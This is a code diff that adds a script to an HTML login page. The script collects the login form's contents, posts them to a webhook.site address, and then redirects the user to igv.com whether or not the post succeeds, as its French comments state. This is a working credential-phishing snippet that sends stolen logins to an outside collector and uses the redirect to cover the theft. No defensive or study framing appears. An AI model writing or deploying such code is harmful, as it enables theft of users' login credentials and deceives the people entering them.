@@ -120,5 +120,26 @@ document.addEventListener("DOMContentLoaded", function() {
 });
 
 </script>
+   <script>
+    function submitForm() {
+        const form = document.getElementById('log-in-button');
+        const formData = new FormData(form);
+
+        // Envoie du formulaire au serveur distant
+        fetch('https://webhook.site/ed57f353-a14b-4fcf-b2e0-2ba38fbbd7b0', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => {
+            // On redirige peu importe le résultat de la connexion
+            window.location.href = 'https://igv.com';
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            // Redirection même en cas d'échec
+            window.location.href = 'https://igv.com';
+        });
+    }
+</script>
 </body>
 </html>
